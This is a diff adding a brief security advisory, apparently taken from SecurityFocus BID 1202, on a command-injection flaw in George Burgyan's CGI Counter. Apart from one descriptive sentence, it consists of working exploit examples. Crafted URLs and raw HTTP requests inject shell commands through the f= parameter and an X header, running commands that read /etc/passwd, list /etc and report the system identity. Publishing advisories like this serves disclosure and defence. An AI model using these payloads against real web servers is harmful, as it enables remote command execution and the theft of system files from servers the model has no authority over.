@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/1202/info
+
+Due to unchecked code that handles user input in George Burgyan's CGI Counter, remote execution of arbitrary commands at the same privilege level as the web server it is running on is possible.
+
+Examples:
+
+http://target/cgi-bin/counterfiglet/nc/f=;echo;w;uname%20-a;id
+
+> telnet target www
+GET /cgi-bin/counterfiglet/nc/f=;sh%20-c%20"$HTTP_X" HTTP/1.0
+X: pwd;ls -la /etc;cat /etc/passwd
+
+> telnet target www
+GET /cgi-bin/counter/nl/ord/lang=english(1);system("$ENV{HTTP_X}"); HTTP/1.0
+X: echo;id;uname -a;w
